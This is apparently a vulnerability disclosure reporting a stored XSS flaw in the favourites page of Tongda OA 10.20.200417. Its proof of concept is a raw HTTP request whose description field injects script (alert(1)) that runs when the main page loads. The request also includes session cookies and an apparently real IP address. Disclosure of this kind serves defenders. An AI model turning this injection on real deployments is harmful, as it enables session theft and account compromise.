# TONGDA OFFICE Anywhere 10.20.200417-store xss

## 漏洞描述

通达OA 控制面板 页面收藏夹处存在存储型xss漏洞

## 复现步骤

### 步骤1

提交poc

```
POST /general/person_info/fav/add.php HTTP/1.1
Host: 127.0.0.1:88
Content-Length: 87
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://211.138.191.187:88
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://211.138.191.187:88/general/person_info/fav/index.php?IS_MAIN=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: SID_1=9cdfdedc; SID_4002=fd08b4a7; USER_NAME_COOKIE=%C0%EE%D3%C2; OA_USER_ID=3795; PHPSESSID=r4pki3jd1etr9bpbfd7o6uivo5; SID_3795=b8a99e8d
Connection: close

URL_NO=1&URL_DESC=cyberlab"]%3balert(1)//&URL=http%3A%2F%2Ftest.com&button=%CC%ED%BC%D3
```



### 步骤2

访问主页面，漏洞触发:

![tongda_xss](https://github.com/jqz41401/jqzCVE/blob/master/img/tongda_xss.jpg)
